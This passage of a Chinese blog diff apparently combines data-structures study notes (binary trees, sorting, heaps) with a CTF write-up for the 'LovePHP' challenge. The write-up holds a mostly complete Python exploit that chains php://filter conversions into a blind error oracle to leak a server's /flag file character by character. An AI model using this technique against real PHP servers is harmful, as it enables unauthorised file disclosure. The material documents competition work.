+&#x2F;&#x2F;插入新节点：分配一个节点大小的内存空间，给数据域赋值，并修改左右孩子和父指针<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="三叉链表"><a href="#三叉链表" class="headerlink" title="三叉链表"></a>三叉链表</h3><ol>
+<li>  包含左右孩子节点和父节点指针</li>
+<li>  三叉链表的目的是为了方便寻找父节点</li>
+</ol>
+<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">typedef struct BiTNode &#123;
+    ElemType data;
+    struct BiTNode *lchild,*rchild;
+    struct BiTNode *parent;
+&#125;BiTNode,*BiTree;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="求树的深度"><a href="#求树的深度" class="headerlink" title="求树的深度"></a>求树的深度</h2><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int treeDepth(BiTree T) &#123; &#x2F;&#x2F;接收二叉树的节点作为参数，通常是根节点
+	if(T &#x3D;&#x3D; NULL) &#123; &#x2F;&#x2F;如果传入的节点是NULL，则返回0，因为空树的高度为0
+		return 0;
+	&#125;
+    &#x2F;&#x2F;if T &#x3D;&#x3D; NULL 一个是判断这棵树是否为空树，另一个是当递归到叶子节点时，可以返回0+1&#x3D;1
+	else &#123;
+		int l &#x3D; treeDepth(T-&gt;lchild);
+         int r &#x3D; treeDepth(T-&gt;rchild);
+        &#x2F;&#x2F;是根据左右子树高度的最大值，应该包含根节点，所以应该+1
+         if(l &gt; r) return l+1;
+         else return r+1;
+	&#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol>
+<li>  递归左右子树高度：treeDepth(T -&gt; lchild); treeDepth(T -&gt; rchild);</li>
+</ol>
+<h2 id="判断节点总数"><a href="#判断节点总数" class="headerlink" title="判断节点总数"></a>判断节点总数</h2><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int count &#x3D; 0;
+void Count(BiTree T) &#123;
+    if(T &#x3D;&#x3D; NULL) &#123;
+        return 0;
+    &#125;
+    else &#123;
+       count++;
+        Count(T-&gt;lchild);
+        Count(T-&gt;rchild);
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol>
+<li>  判断节点总数，递归左右子树，并在递归左右子树之前要count++</li>
+<li>  二叉树判断左右子树高度和统计节点总数，都要递归实现，并递归返回的条件是传入的节点为空</li>
+</ol>
+<h2 id="设计算法按前序次序打印二叉树中的叶子结点"><a href="#设计算法按前序次序打印二叉树中的叶子结点" class="headerlink" title="设计算法按前序次序打印二叉树中的叶子结点"></a>设计算法按前序次序打印二叉树中的叶子结点</h2><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void PrintLeaves(BiTree T) &#123;
+    if(T &#x3D;&#x3D; NULL) &#123;
+        return;
+    &#125;
+    if(T -&gt; lchild &#x3D;&#x3D; NULL &amp;&amp; T -&gt; rchild &#x3D;&#x3D; NULL) &#123; &#x2F;&#x2F;判断是否为叶子节点
+        printf(&quot;%d&quot;,T-&gt;data); &#x2F;&#x2F; 只打印叶子节点
+    &#125;
+    PrintLeaves(T -&gt; lchild); &#x2F;&#x2F;递归处理左子树
+    PrintLeaves(T -&gt; rchild); &#x2F;&#x2F;递归处理右子树
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="前序序列打印所有节点"><a href="#前序序列打印所有节点" class="headerlink" title="前序序列打印所有节点"></a>前序序列打印所有节点</h2><ol>
+<li><p>  和只打印叶子节点相比，少了一个对是否为叶子节点的判断，即</p>
+</li>
+<li><p>```c++<br>  if(T -&gt; lchild == NULL &amp;&amp; T -&gt; rchild == NULL) {}</p>
+<p>  if(T -&gt; lchild == NULL &amp;&amp; T -&gt; rchild == NULL){}<br>  //叶子节点有一个判断，即左右孩子是否为空<br>  if(T -&gt; lchild == NULL &amp;&amp; T -&gt; rchild == NULL){}<br>  if(T -&gt; lchild – NULL &amp;&amp; T -&gt; rchild == NULL){}</p>
+  <pre class="line-numbers language-none"><code class="language-none">     
+3.   &#96;&#96;&#96;c++
+     void PrintPreorder(BiTree T) &#123;
+     	if(T &#x3D;&#x3D; NULL) &#123;
+             return;
+         &#125;
+         else &#123;
+             printf(&quot;%d&quot;,T -&gt; data);
+             PrintPreorder(T -&gt; lchild);
+             PrintPreorder(T -&gt; rchild);
+         &#125;
+     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h1 id="已知数组A-n-中的元素为整型，设计算法将其调整为左右两部分，左边所有元素为偶数，右边所有元素为奇数，并要求算法的时间复杂度为O-n"><a href="#已知数组A-n-中的元素为整型，设计算法将其调整为左右两部分，左边所有元素为偶数，右边所有元素为奇数，并要求算法的时间复杂度为O-n" class="headerlink" title="已知数组A[n]中的元素为整型，设计算法将其调整为左右两部分，左边所有元素为偶数，右边所有元素为奇数，并要求算法的时间复杂度为Ｏ(n)"></a>已知数组A[n]中的元素为整型，设计算法将其调整为左右两部分，左边所有元素为偶数，右边所有元素为奇数，并要求算法的时间复杂度为Ｏ(n)</h1><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void Array_reverse() &#123;
+	int i &#x3D; 0,j &#x3D; n-1;
+	while(i &lt; j) &#123; &#x2F;&#x2F;i是左侧，j是右侧，只有当i指针在j指针的左侧时，才继续进行交换操作
+		while(a[i] % 2 &#x3D;&#x3D; 0) i++; &#x2F;&#x2F;a[i]满足要求，i指针后移,直到遇到一个奇数 
+		while(a[j] % 2 !&#x3D; 0) j--; &#x2F;&#x2F;a[j]满足要求，j指针前移，直到遇到一个偶数停止 
+		if(i &lt; j) swap(a[i],a[j]);  
+	&#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol>
+<li>  从数组的两端向中间比较，设置两个变量i和j，初始时i=0，j=n-1，若A[i]为偶数并且A[j]为奇数，则将A[i]与A[j]交换。</li>
+</ol>
+<h1 id="试写出带头节点的单链表逆置算法，请写出结点结构"><a href="#试写出带头节点的单链表逆置算法，请写出结点结构" class="headerlink" title="试写出带头节点的单链表逆置算法，请写出结点结构???"></a>试写出带头节点的单链表逆置算法，请写出结点结构???</h1><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">LinkList Reverse(LinkList L) &#123;
+	LNode *p,*r; &#x2F;&#x2F;前指针和后指针
+	p &#x3D; L -&gt; next;
+	L -&gt; next &#x3D; NULL;
+	
+	while(p !&#x3D; NULL) &#123;
+		r &#x3D; p -&gt; next;
+		p -&gt; next &#x3D; L -&gt; next;
+		L -&gt; next &#x3D; p;
+		p &#x3D; r;
+	&#125; 
+	return L;
+&#125;
+&#x2F;&#x2F;第一步，设置前后指针
+&#x2F;&#x2F;第二步，p为第一个元素位置，断开头节点的下一个位置，断链
+&#x2F;&#x2F;第三步，判断p是否为空
+&#x2F;&#x2F;第四步，r指针后移
+&#x2F;&#x2F;第五步，p-&gt;next &#x3D; L-&gt;next;
+&#x2F;&#x2F;第六步，L-&gt;next &#x3D; p;
+&#x2F;&#x2F;第七步，p指针后移指向r
+&#x2F;&#x2F;zui&#39;ho<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="关键路径每次都取最大值"><a href="#关键路径每次都取最大值" class="headerlink" title="关键路径每次都取最大值"></a>关键路径每次都取最大值</h1><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230901205604.png"></p>
+<h1 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h1><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void InsertSort(int a[],int len) &#123;
+    for(int j &#x3D; 1;j &lt; len;j++) &#123; &#x2F;&#x2F;外部循环，从数组的第二个位置遍历到最后一个位置，外部循环控制我们要将哪个元素插入到已经排序的子数组中
+        int key &#x3D; a[j];
+        int i &#x3D; j - 1; &#x2F;&#x2F;i从当前元素的前一个元素开始
+        while(i &gt;&#x3D; 0 &amp;&amp; a[i] &gt; key) &#123;
+            a[i+1] &#x3D; a[i];
+            i--;
+        &#125;
+        a[i+1] &#x3D; key;
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h1><ol>
+<li>  堆必须是一颗完全二叉树</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230901213309.png"></li>
+<li>  在小根堆中，每个父节点都必须小于子节点元素</li>
+<li>  在大根堆中，每个父节点都必须大于子节点元素</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230901213432.png"></li>
+<li>  按照层序遍历的顺序来给节点编号</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230901213803.png"></li>
+</ol>
+<h2 id="上滤"><a href="#上滤" class="headerlink" title="上滤"></a>上滤</h2><ol>
+<li>  当叶子节点破坏了堆序性，让他和他的父元素比较,若大于父节点则交换，直到无法上移为止，</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230901214131.png"></li>
+</ol>
+<h2 id="下滤"><a href="#下滤" class="headerlink" title="下滤"></a>下滤</h2><ol>
+<li>  将破坏堆序性的元素跟他的<strong>最大</strong>的子节点比较，如果小于他的最大子节点，则交换</li>
+<li>  持续比较，直到该元素大于他的子节点位置，或者移动到底部为止</li>
+</ol>
+<h2 id="总之，上滤是和父节点比较，下滤是和子节点比较，只能父子之间交换"><a href="#总之，上滤是和父节点比较，下滤是和子节点比较，只能父子之间交换" class="headerlink" title="总之，上滤是和父节点比较，下滤是和子节点比较，只能父子之间交换"></a>总之，上滤是和父节点比较，下滤是和子节点比较，只能父子之间交换</h2><h2 id="建堆"><a href="#建堆" class="headerlink" title="建堆"></a>建堆</h2><ol>
+<li>  自顶向下建堆法</li>
+<li>  将元素一个一个插入到堆内，将新元素放到堆的最后一位，然后对其进行上滤操作</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230901214950.png"></li>
+</ol>
+<h2 id="取最值调整"><a href="#取最值调整" class="headerlink" title="取最值调整"></a>取最值调整</h2><ol>
+<li>  在大根堆中，如果父节点比两个子节点都要小，则选最大的往上走</li>
+<li>  在小根堆中，如果父节点比两个子节点都要大，则选最小的往上走</li>
+</ol>
+<h2 id="排序顺序：从最后一个父节点开始往上找"><a href="#排序顺序：从最后一个父节点开始往上找" class="headerlink" title="排序顺序：从最后一个父节点开始往上找"></a>排序顺序：从最后一个父节点开始往上找</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230901221115.png"></p>
+<h1 id="错题"><a href="#错题" class="headerlink" title="错题"></a>错题</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><ol>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230914135244.png"></li>
+</ol>
+<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><ol start="2">
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230914135322.png"></li>
+</ol>
+<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><ol start="3">
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230914135343.png"></li>
+<li>  对角矩阵：在非对角线上的元素均为0的方阵，只有主对角线（左上右下）上有非零元素</li>
+<li>  三角矩阵：某个对角线以上/以下所有元素均为0的方针</li>
+<li>  稀疏矩阵：具有大量0元素的矩阵</li>
+<li>  对称矩阵：矩阵的转置与自身相等，a[‘i’] [‘j’] = a[j] [i]</li>
+<li>  稀疏矩阵不属于特殊矩阵</li>
+</ol>
+<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><ol>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230914135411.png"></li>
+<li>  左斜树/右斜树的前序序列和后续序列正好相反</li>
+<li>  如果先序序列和后序序列正好相反，那么先序序列的第一个节点就是根节点，后序序列最后一个节点就是根节点</li>
+<li>  由于二叉树的深度==节点数，每个节点都对应一次进入根节点的位置</li>
+</ol>
+<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><ol>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230914135430.png"></li>
+</ol>
+<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><ol>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230914135500.png"></li>
+</ol>
+<h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><ol>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230914135523.png"></li>
+</ol>
+<h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><ol>
+<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230914135540.png"><ol>
+<li>  顺序查找平均长度==1+len/2 就是最好和最坏两个情况的平均值</li>
+</ol>
+</li>
+</ol>
+<h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><ol>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230914135559.png"></li>
+</ol>
+<h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><ol>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230914135609.png"></li>
+<li>  插帽龟稳定</li>
+<li>  选堆龟时间复杂度相同</li>
+<li>  插入、冒泡、选择三个最简单的时间复杂度n方</li>
+<li>  堆、快排、归并三个熟悉的n*logn</li>
+<li>  希尔是二者之间</li>
+</ol>
+<h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><ol>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230914135624.png"></li>
+<li>  循环队列也存在空间溢出问题</li>
+<li>  循环队列中有一个判断队列空、满的位置，如果被占用，则无法判断空还是满，继续添加会溢出</li>
+</ol>
+<h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><ol>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230914135651.png"></li>
+<li>  什么是AOV网和AOE网</li>
+</ol>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/LovePHP/">
+                Ciscn初赛——LovePHP题目wp
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2023-08-27</span>
+            
+            
+                <a href="http://dezhoutorizhao.github.io/LovePHP/#disqus_thread" class="comments article-comment-link">留言</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/CTF/">CTF</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="LovePHP"><a href="#LovePHP" class="headerlink" title="LovePHP"></a>LovePHP</h1><ol>
+<li><p>  PHP特性题目</p>
+</li>
+<li><p>  引发服务器500错误，观察PHP过滤器的行为，创建过滤器链进行攻击</p>
+</li>
+<li><pre><code class="python">  import requests
   import sys
   from base64 import b64decode
   
@@ -280,12 +1496,448 @@
   the string is empty.
   
   THE GRAND IDEA 2:
-  The d ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E5%BE%B7%E5%B7%9E%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/" title="德州攻防演练">德州攻防演练</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-08-06T13:50:38.757Z" title="发表于 2023-08-06 21:50:38">2023-08-06</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%AE%9E%E6%88%98/">实战</a></span></div><div class="content">德州市公共汽车公司
+  The dechunk filter is interesting.
+  https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724
+  It looks like it was implemented for something http related, but for our purposes, the interesting
+  behavior is that if the string contains no newlines, it will wipe the entire string if and only if
+  the string starts with A-Fa-f0-9, otherwise it will leave it untouched. This works perfect with our
+  above oracle! In fact we can verify that since the flag starts with D that the filter chain
   
+  dechunk|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|[...]|convert.iconv.L1.UCS-4LE
+  
+  does not cause a 500 error.
+  
+  THE REST:
+  So now we can verify if the first character is in A-Fa-f0-9. The rest of the challenge is a descent
+  into madness trying to figure out ways to:
+  - somehow get other characters not at the start of the flag file to the front
+  - detect more precisely which character is at the front
+  &quot;&quot;&quot;
+  
+  def join(*x):
+      return &#39;|&#39;.join(x)
+  
+  def err(s):
+      print(s)
+      raise ValueError
+  
+  def req(s):
+      param = &#39;&#123;&#125;&#39;
+      data = f&#39;&#123;param&#125;&amp;secret=php://filter/&#123;s&#125;/resource=/flag&#39;
+  
+      return requests.get(f&#39;http://IP+PORT/index.php?my[secret.flag=C:8:&quot;Saferman&quot;:0:&#123;data&#125;&#39;).status_code == 500
+  
+  &quot;&quot;&quot;
+  Step 1:
+  The second step of our exploit only works under two conditions:
+  - String only contains a-zA-Z0-9
+  - String ends with two equals signs
+  
+  base64-encoding the flag file twice takes care of the first condition.
+  
+  We don&#39;t know the length of the flag file, so we can&#39;t be sure that it will end with two equals
+  signs.
+  
+  Repeated application of the convert.quoted-printable-encode will only consume additional
+  memory if the base64 ends with equals signs, so that&#39;s what we are going to use as an oracle here.
+  If the double-base64 does not end with two equals signs, we will add junk data to the start of the
+  flag with convert.iconv..CSISO2022KR until it does.
+  &quot;&quot;&quot;
+  
+  blow_up_enc = join(*[&#39;convert.quoted-printable-encode&#39;]*1000)
+  blow_up_utf32 = &#39;convert.iconv.L1.UCS-4LE&#39;
+  blow_up_inf = join(*[blow_up_utf32]*50)
+  
+  header = &#39;convert.base64-encode|convert.base64-encode&#39;
+  
+  # Start get baseline blowup
+  print(&#39;Calculating blowup&#39;)
+  baseline_blowup = 0
+  for n in range(100):
+      payload = join(*[blow_up_utf32]*n)
+      if req(f&#39;&#123;header&#125;|&#123;payload&#125;&#39;):
+          baseline_blowup = n
+          break
+  else:
+      err(&#39;something wrong&#39;)
+  
+  print(f&#39;baseline blowup is &#123;baseline_blowup&#125;&#39;)
+  
+  trailer = join(*[blow_up_utf32]*(baseline_blowup-1))
+  
+  assert req(f&#39;&#123;header&#125;|&#123;trailer&#125;&#39;) == False
+  
+  print(&#39;detecting equals&#39;)
+  j = [
+      req(f&#39;convert.base64-encode|convert.base64-encode|&#123;blow_up_enc&#125;|&#123;trailer&#125;&#39;),
+      req(f&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#123;blow_up_enc&#125;|&#123;trailer&#125;&#39;),
+      req(f&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|&#123;blow_up_enc&#125;|&#123;trailer&#125;&#39;)
+  ]
+  print(j)
+  if sum(j) != 2:
+      err(&#39;something wrong&#39;)
+  if j[0] == False:
+      header = f&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#39;
+  elif j[1] == False:
+      header = f&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode&#39;
+  elif j[2] == False:
+      header = f&#39;convert.base64-encode|convert.base64-encode&#39;
+  else:
+      err(&#39;something wrong&#39;)
+  print(f&#39;j: &#123;j&#125;&#39;)
+  print(f&#39;header: &#123;header&#125;&#39;)
+  
+  &quot;&quot;&quot;
+  Step two:
+  Now we have something of the form
+  [a-zA-Z0-9 things]==
+  
+  Here the pain begins. For a long time I was trying to find something that would allow me to strip
+  successive characters from the start of the string to access every character. Maybe something like
+  that exists but I couldn&#39;t find it. However, if you play around with filter combinations you notice
+  there are filters that *swap* characters:
+  
+  convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:
+  abcdefgh -&gt; badcfehg
+  
+  convert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:
+  abcdefgh -&gt; dcbahgfe
+  
+  This allows us to access the first four characters of the string. Can we do better? It turns out
+  YES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends &lt;0xff&gt;&lt;0xfe&gt; to the start of
+  the string:
+  
+  abcdefgh -&gt; &lt;0xff&gt;&lt;0xfe&gt;abcdefgh
+  
+  The idea being that if we now use the r4 gadget, we get something like:
+  ba&lt;0xfe&gt;&lt;0xff&gt;fedc
+  
+  And then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid
+  &lt;0xfe&gt;&lt;0xff&gt; to get:
+  bafedc
+  
+  And then apply the r4 again, we have swapped the f and e to the front, which were the 5th and 6th
+  characters of the string. There&#39;s only one problem: our r4 gadget requires that the string length
+  is a multiple of 4. The original base64 string will be a multiple of four by definition, so when
+  we apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which is no
+  good for our r4 gadget. This is where the double equals we required in step 1 comes in! Because it
+  turns out, if we apply the filter
+  convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7
+  
+  It will turn the == into:
+  +---AD0-3D3D+---AD0-3D3D
+  
+  And this is magic, because this corrects such that when we apply the
+  convert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!
+  
+  Let&#39;s recap. We have a string like:
+  abcdefghij==
+  
+  Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:
+  abcdefghij+---AD0-3D3D+---AD0-3D3D
+  
+  Apply convert.iconv.CSUNICODE.CSUNICODE:
+  &lt;0xff&gt;&lt;0xfe&gt;abcdefghij+---AD0-3D3D+---AD0-3D3D
+  
+  Apply r4 gadget:
+  ba&lt;0xfe&gt;&lt;0xff&gt;fedcjihg---+-0DAD3D3---+-0DAD3D3
+  
+  Apply base64-decode | base64-encode, so the &#39;-&#39; and high bytes will disappear:
+  bafedcjihg+0DAD3D3+0DAD3Dw==
+  
+  Then apply r4 once more:
+  efabijcd0+gh3DAD0+3D3DAD==wD
+  
+  And here&#39;s the cute part: not only have we now accessed the 5th and 6th chars of the string, but
+  the string still has two equals signs in it, so we can reapply the technique as many times as we
+  want, to access all the characters in the string ;)
+  &quot;&quot;&quot;
+  
+  flip = &quot;convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode&quot;
+  r2 = &quot;convert.iconv.CSUNICODE.UCS-2BE&quot;
+  r4 = &quot;convert.iconv.UCS-4LE.10646-1:1993&quot;
+  
+  def get_nth(n):
+      global flip, r2, r4
+      o = []
+      chunk = n // 2
+      if chunk % 2 == 1: o.append(r4)
+      o.extend([flip, r4] * (chunk // 2))
+      if (n % 2 == 1) ^ (chunk % 2 == 1): o.append(r2)
+      return join(*o)
+  
+  &quot;&quot;&quot;
+  Step 3:
+  This is the longest but actually easiest part. We can use dechunk oracle to figure out if the first
+  char is 0-9A-Fa-f. So it&#39;s just a matter of finding filters which translate to or from those
+  chars. rot13 and string lower are helpful. There are probably a million ways to do this bit but
+  I just bruteforced every combination of iconv filters to find these.
+  
+  Numbers are a bit trickier because iconv doesn&#39;t tend to touch them.
+  In the CTF you coud porbably just guess from there once you have the letters. But if you actually 
+  want a full leak you can base64 encode a third time and use the first two letters of the resulting
+  string to figure out which number it is.
+  &quot;&quot;&quot;
+  
+  rot1 = &#39;convert.iconv.437.CP930&#39;
+  be = &#39;convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode&#39;
+  o = &#39;&#39;
+  
+  def find_letter(prefix):
+      if not req(f&#39;&#123;prefix&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
+          # a-f A-F 0-9
+          if not req(f&#39;&#123;prefix&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
+              # a-e
+              for n in range(5):
+                  if req(f&#39;&#123;prefix&#125;|&#39; + f&#39;&#123;rot1&#125;|&#123;be&#125;|&#39;*(n+1) + f&#39;&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
+                      return &#39;edcba&#39;[n]
+                      break
+              else:
+                  err(&#39;something wrong&#39;)
+          elif not req(f&#39;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
+              # A-E
+              for n in range(5):
+                  if req(f&#39;&#123;prefix&#125;|string.tolower|&#39; + f&#39;&#123;rot1&#125;|&#123;be&#125;|&#39;*(n+1) + f&#39;&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
+                      return &#39;EDCBA&#39;[n]
+                      break
+              else:
+                  err(&#39;something wrong&#39;)
+          elif not req(f&#39;&#123;prefix&#125;|convert.iconv.CSISO5427CYRILLIC.855|dechunk|&#123;blow_up_inf&#125;&#39;):
+              return &#39;*&#39;
+          elif not req(f&#39;&#123;prefix&#125;|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
+              # f
+              return &#39;f&#39;
+          elif not req(f&#39;&#123;prefix&#125;|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
+              # F
+              return &#39;F&#39;
+          else:
+              err(&#39;something wrong&#39;)
+      elif not req(f&#39;&#123;prefix&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
+          # n-s N-S
+          if not req(f&#39;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
+              # n-r
+              for n in range(5):
+                  if req(f&#39;&#123;prefix&#125;|string.rot13|&#39; + f&#39;&#123;rot1&#125;|&#123;be&#125;|&#39;*(n+1) + f&#39;&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
+                      return &#39;rqpon&#39;[n]
+                      break
+              else:
+                  err(&#39;something wrong&#39;)
+          elif not req(f&#39;&#123;prefix&#125;|string.rot13|string.tolower|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
+              # N-R
+              for n in range(5):
+                  if req(f&#39;&#123;prefix&#125;|string.rot13|string.tolower|&#39; + f&#39;&#123;rot1&#125;|&#123;be&#125;|&#39;*(n+1) + f&#39;&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
+                      return &#39;RQPON&#39;[n]
+                      break
+              else:
+                  err(&#39;something wrong&#39;)
+          elif not req(f&#39;&#123;prefix&#125;|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
+              # s
+              return &#39;s&#39;
+          elif not req(f&#39;&#123;prefix&#125;|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
+              # S
+              return &#39;S&#39;
+          else:
+              err(&#39;something wrong&#39;)
+      elif not req(f&#39;&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
+          # i j k
+          if req(f&#39;&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
+              return &#39;k&#39;
+          elif req(f&#39;&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
+              return &#39;j&#39;
+          elif req(f&#39;&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
+              return &#39;i&#39;
+          else:
+              err(&#39;something wrong&#39;)
+      elif not req(f&#39;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
+          # I J K
+          if req(f&#39;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
+              return &#39;K&#39;
+          elif req(f&#39;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
+              return &#39;J&#39;
